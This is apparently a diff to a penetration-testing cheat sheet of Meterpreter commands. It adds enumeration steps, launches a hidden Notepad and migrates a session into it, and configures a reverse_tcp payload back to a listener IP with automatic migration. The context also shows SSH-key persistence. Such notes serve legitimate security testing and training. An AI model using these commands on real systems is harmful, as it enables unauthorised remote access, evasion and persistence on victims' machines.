@@ -4,6 +4,13 @@
 
 <summary>Useful commands</summary>
 
+### Enumeration
+
+```bash
+sysinfo
+getuid
+```
+
 ### Enable Logging
 
 ```
@@ -20,6 +27,28 @@ setg LHOST 192.168.1.101
 
 ```bash
 execute -i -H -f "cmd"
+```
+
+</details>
+
+<details>
+
+<summary>Migrate Process</summary>
+
+### Create Hidden instance of Notepad & Migration
+
+```bash
+execute -H -f notepad
+migrate <pid of notepad>
+```
+
+### Automates the migration of the Meterpreter session
+
+```bash
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.119.160
+set LPORT 80
+set AutoRunScript post/windows/manage/migrate
 ```
 
 </details>
@@ -114,15 +143,3 @@ set AutoRunScript post/linux/manage/sshkey_persistence
 
 </details>
 
-<details>
-
-<summary>Migrate Process</summary>
-
-```bash
-set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.119.160
-set LPORT 80
-set AutoRunScript post/windows/manage/migrate
-```
-
-</details>
